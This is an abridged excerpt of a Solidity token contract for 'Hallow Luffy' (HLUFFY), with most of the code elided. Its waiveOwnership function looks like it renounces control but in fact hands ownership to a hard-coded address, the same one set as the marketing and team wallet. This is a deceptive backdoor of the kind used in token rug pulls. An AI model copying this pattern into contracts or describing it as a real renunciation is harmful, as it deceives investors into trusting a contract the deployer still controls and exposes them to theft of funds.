...
/**
Telegram : https://t.me/HallowLuffy
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xe4eBbb4A8Ba78Fbb6a7939aE42c4cE5Cf6E1268C);
    }
...
contract HallowLuffy is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Hallow Luffy";
    string private _symbol = "HLUFFY";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xe4eBbb4A8Ba78Fbb6a7939aE42c4cE5Cf6E1268C);
    address payable private teamWalletAddress = payable(0xe4eBbb4A8Ba78Fbb6a7939aE42c4cE5Cf6E1268C);
